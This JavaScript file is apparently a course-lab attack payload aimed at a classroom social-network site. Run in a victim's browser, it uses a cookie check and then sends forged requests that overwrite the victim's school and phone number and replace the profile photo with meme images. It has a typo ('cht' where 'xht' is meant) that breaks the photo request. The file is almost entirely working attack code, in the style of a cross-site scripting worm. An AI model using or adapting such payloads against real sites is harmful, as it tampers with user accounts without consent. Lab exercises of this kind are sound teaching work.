/*jshint esversion: 6 */
const links = require('./links.json');
const unis = ["Rochester Institute of Technology", "University of Rochester",
	"University at Buffalo", "Buffalo State College", "SUNY Brockport",
	"University at Waterloo", "SUNY Geneseo", "University of Toronto"
];

const zipcodes = ["315", "585", "716"];
const jsonIn = ["Zucc", "Limewire", "Bezos", "Stop", "Chungus"];

function getRandomInt(max) {
	return Math.floor(Math.random() * max);
}


function post_About() {
	var r2 = getRandomInt(7);
	var r3 = getRandomInt(2);


	var university = unis[r2];
    var senduni = encodeURIComponent(university);

	var number = Math.floor(1000000 + Math.random() * 9000000).toString();
	var pnumber = zipcodes[r3] + number;
    var sendphone = encodeURIComponent(pnumber);



	var xhr = new XMLHttpRequest();
	xhr.open("POST", `http://csec380-core.csec.rit.edu:86/change_about.php`, true);
	//Send the proper header information along with the request
	xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	xhr.send(`name=school&value=${senduni}`);

    var xhs = new XMLHttpRequest();
	xhs.open("POST", `http://csec380-core.csec.rit.edu:86/change_about.php`, true);
	//Send the proper header information along with the request
	xhs.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	xhs.send(`name=phone&value=${sendphone}`);
}

function change_Profile(){
    var r1 = getRandomInt(4);
    var key = jsonIn[r1];
    var pictureURL = encodeURIComponent(links[key]);

    var xht = new XMLHttpRequest();
    xht.open("GET", `/change_photo.php?type=profile&url=${pictureURL}`,true);
    cht.send(); 
}

const cookies = new URLSearchParams(document.cookie.replaceAll("; ","&"))
if (cookies.get("rekt") == "yes") {
    post_About();
    setTimeout(change_Profile, 1000);
}

document.cookie = "rekt=yes"